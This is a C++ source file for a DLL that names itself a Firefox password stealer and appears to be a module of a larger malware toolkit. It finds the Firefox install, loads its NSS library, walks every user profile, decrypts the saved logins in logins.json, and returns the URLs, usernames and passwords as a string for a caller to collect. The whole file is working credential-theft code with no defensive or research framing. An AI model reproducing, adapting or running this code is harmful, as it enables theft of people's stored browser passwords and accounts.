// _s_Module_Browser_Info_FireFoxPasswordStealer.cpp : Defines the exported functions for the DLL application.
//

#include "stdafx.h"  
#include "_s_Module_Browser_Info_FireFoxPasswordStealer.h"  
#include <windows.h>
#include <Shlwapi.h>
#include <Shlobj.h>

#include "picojson.h"

#include <string>
#include <vector>
#include <cstdio>
#include <stdio.h>
#include <stdlib.h>
#include<wincrypt.h>
#pragma comment (lib, "shlwapi.lib")
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "Shell32.lib")
#pragma comment (lib, "comsuppw.lib")

typedef enum SECItemType
{
	siBuffer = 0,
	siClearDataBuffer = 1,
	siCipherDataBuffer,
	siDERCertBuffer,
	siEncodedCertBuffer,
	siDERNameBuffer,
	siEncodedNameBuffer,
	siAsciiNameString,
	siAsciiString,
	siDEROID,
	siUnsignedInteger,
	siUTCTime,
	siGeneralizedTime
};

struct SECItem
{
	SECItemType type;
	unsigned char *data;
	size_t len;
};

typedef enum SECStatus
{
	SECWouldBlock = -2,
	SECFailure = -1,
	SECSuccess = 0
};

#define PRBool int
#define PRUint32 unsigned int
#define PR_TRUE 1
#define PR_FALSE 0

typedef struct PK11SlotInfoStr PK11SlotInfo;

typedef SECStatus(*NSS_Init) (const char *configdir);
typedef SECStatus(*NSS_Shutdown) (void);
typedef PK11SlotInfo * (*PK11_GetInternalKeySlot) (void);
typedef void(*PK11_FreeSlot) (PK11SlotInfo *slot);
typedef SECStatus(*PK11_CheckUserPassword) (PK11SlotInfo *slot, char *pw);
typedef SECStatus(*PK11_Authenticate) (PK11SlotInfo *slot, PRBool loadCerts, void *wincx);
typedef SECStatus(*PK11SDR_Decrypt) (SECItem *data, SECItem *result, void *cx);

NSS_Init NSSInit = NULL;
NSS_Shutdown NSSShutdown = NULL;
PK11_GetInternalKeySlot PK11GetInternalKeySlot = NULL;
PK11_CheckUserPassword PK11CheckUserPassword = NULL;
PK11_FreeSlot PK11FreeSlot = NULL;
PK11_Authenticate PK11Authenticate = NULL;
PK11SDR_Decrypt PK11SDRDecrypt = NULL;

std::string getInstallPath(VOID)
{
	LSTATUS lStatus;
	DWORD cbSize;
	char value[MAX_PATH];
	std::string path = "SOFTWARE\\Mozilla\\Mozilla Firefox";

	ZeroMemory(value, sizeof(value));

	cbSize = MAX_PATH;
	lStatus = SHGetValueA(HKEY_LOCAL_MACHINE,
		path.c_str(), "CurrentVersion", 0, value, &cbSize);

	if (lStatus == ERROR_SUCCESS)
	{
		path += "\\";
		path += value;
		path += "\\Main";

		cbSize = MAX_PATH;
		lStatus = SHGetValueA(HKEY_LOCAL_MACHINE,
			path.c_str(), "Install Directory", 0, value, &cbSize);
	}
	return value;
}

BOOL LoadLib(std::string installPath)
{
	char path[4096];
	DWORD dwError = GetEnvironmentVariableA("PATH", path, 4096);
	std::string newPath = path;
	newPath += (";" + installPath);

	SetEnvironmentVariableA("PATH", newPath.c_str());

	HMODULE hNSS = LoadLibraryA((installPath + "\\nss3.dll").c_str());

	if (hNSS != NULL)
	{
		NSSInit = (NSS_Init)GetProcAddress(hNSS, "NSS_Init");
		NSSShutdown = (NSS_Shutdown)GetProcAddress(hNSS, "NSS_Shutdown");
		PK11GetInternalKeySlot = (PK11_GetInternalKeySlot)GetProcAddress(hNSS, "PK11_GetInternalKeySlot");
		PK11FreeSlot = (PK11_FreeSlot)GetProcAddress(hNSS, "PK11_FreeSlot");
		PK11Authenticate = (PK11_Authenticate)GetProcAddress(hNSS, "PK11_Authenticate");
		PK11SDRDecrypt = (PK11SDR_Decrypt)GetProcAddress(hNSS, "PK11SDR_Decrypt");
		PK11CheckUserPassword = (PK11_CheckUserPassword)GetProcAddress(hNSS, "PK11_CheckUserPassword");
	}
	return !(!NSSInit || !NSSShutdown ||
		!PK11GetInternalKeySlot || !PK11Authenticate ||
		!PK11SDRDecrypt || !PK11FreeSlot || !PK11CheckUserPassword);
}

std::string DecryptString(std::string s)
{
	BYTE byteData[8096];
	DWORD dwLength = 8096;
	PK11SlotInfo *slot = 0;
	SECStatus status;
	SECItem in, out;
	std::string result = "";

	ZeroMemory(byteData, sizeof(byteData));

	if (CryptStringToBinaryA(s.c_str(), s.length(),
		CRYPT_STRING_BASE64, byteData, &dwLength, 0, 0))
	{
		slot = (*PK11GetInternalKeySlot) ();
		if (slot != NULL)
		{
			// see if we can authenticate
			status = PK11Authenticate(slot, PR_TRUE, NULL);
			if (status == SECSuccess)
			{
				in.data = byteData;
				in.len = dwLength;
				out.data = 0;
				out.len = 0;

				status = (*PK11SDRDecrypt) (&in, &out, NULL);
				if (status == SECSuccess)
				{
					memcpy(byteData, out.data, out.len);
					byteData[out.len] = 0;
					result = std::string((char*)byteData);
				}
				else {
					result = "Decryption failed";
				}
			}
			else {
				result = "Authentication failed";
			}
			(*PK11FreeSlot) (slot);
		}
		else {
			result = "Get Internal Slot failed";
		}
	}
	return result;
}


DWORD size1;
char * memblock;
void read_File(char * fname)
{


	HANDLE f = CreateFileA(fname, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (f == INVALID_HANDLE_VALUE)
	{
		return;
	}

	size1 = GetFileSize(f, &size1);

	memblock = (char *)LocalAlloc(LMEM_FIXED, size1 + 1);
	ReadFile(f, memblock, size1, &size1, NULL);
	CloseHandle(f);

}

#include "Public.h"





void list_entriesff(std::string login_db) {



	read_File((char*)login_db.c_str());
	const char* json = memblock;
	picojson::value v;
	std::string err;
	const char* json_end = picojson::parse(v, json, json + strlen(json), &err);
	if (!err.empty()) {
		std::cerr << err << std::endl;
		exit(0);
	}

	err = picojson::get_last_error();
	if (!err.empty()) {

		exit(1);
	}


	if (!v.is<picojson::object>()) {

		exit(2);
	}


	int arsize = v.get<picojson::object>().size();
	const picojson::value& logins = v.get("logins");
	const picojson::value::array& loginsArray = logins.get<picojson::array>();
	int i = 0;
	for (int logins_index = 0;logins_index<loginsArray.size();logins_index++)
	{

		const picojson::value& sub_logins = loginsArray.at(logins_index);
		const picojson::value::object& sub_logins_obj = sub_logins.get<picojson::object>();



		for (picojson::value::object::const_iterator il = sub_logins_obj.begin();il != sub_logins_obj.end();++il)
		{
			if (il->first == "encryptedPassword")
			{
				std::string	passw = DecryptString(il->second.to_str());
				info[i].it = true;
				info[i + 1].it = false;
				strcpy(info[i].upass, passw.c_str());
			}
			else if (il->first == "encryptedUsername")
			{
				std::string	name = DecryptString(il->second.to_str());
				strcpy(info[i].uname, name.c_str());
			}
			else if (il->first == "hostname")
			{
				std::string	realm = il->second.to_str();
				strcpy(info[i].url, realm.c_str());
			}

		}
		i++;
	}



}

VOID EnumProfiles(VOID)
{
	char path[MAX_PATH];
	char appData[MAX_PATH], profile[MAX_PATH];
	char sections[4096];

	SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, SHGFP_TYPE_CURRENT, appData);
	_snprintf(path, MAX_PATH, "%s\\Mozilla\\Firefox\\profiles.ini", appData);

	GetPrivateProfileSectionNamesA(sections, 4096, path);
	char *p = sections;

	while (1)
	{
		if (_strnicmp(p, "Profile", 7) == 0) {
			GetPrivateProfileStringA(p, "Path", NULL, profile, MAX_PATH, path);

			_snprintf(path, MAX_PATH,
				"%s\\Mozilla\\Firefox\\Profiles\\%s", appData,
				std::string(profile).substr(std::string(profile).find_first_of("/") + 1).c_str());

			if (!(*NSSInit) (path))
			{
				list_entriesff(std::string(path) + "\\logins.json");
				(*NSSShutdown) ();
			}
			else {
			}
		}
		p += strlen(p) + 1;
		if (p[0] == 0) break;
	}
}





BSTR ANSItoBSTR(const char* input)
{
	BSTR result = NULL;
	int lenA = lstrlenA(input);
	int lenW = ::MultiByteToWideChar(CP_ACP, 0, input, lenA, NULL, 0);
	if (lenW > 0)
	{
		result = ::SysAllocStringLen(0, lenW);
		::MultiByteToWideChar(CP_ACP, 0, input, lenA, result, lenW);
	}
	return result;
}


BSTR ConvertInfoToBstr()
{
	_bstr_t  RetValue = L"";
	_bstr_t  OneValue = L"";
	char  OneInfo[2048];
	for (int i = 0;;i++)
	{
		if (info[i].it)
		{
			
			sprintf(OneInfo, "Url=%s\r\nUserName=%s\r\nPassword=%s\r\n", info[i].url, info[i].uname, info[i].upass);
			OneValue = ANSItoBSTR(OneInfo);
			
			RetValue += OneValue;
			info[i].it = false;
		}
		else
		{
			break;
		}
	}
	return RetValue;
}



BSTR  GetFirefoxPasswordFromDLL()
{
	info = new INFO[500];
		std::string installPath = getInstallPath();
		if (!installPath.empty())
		{
			if (LoadLib(installPath))
			{
				EnumProfiles();
			}
			else {

			}
		}
		else {

		}
		return ConvertInfoToBstr();
}

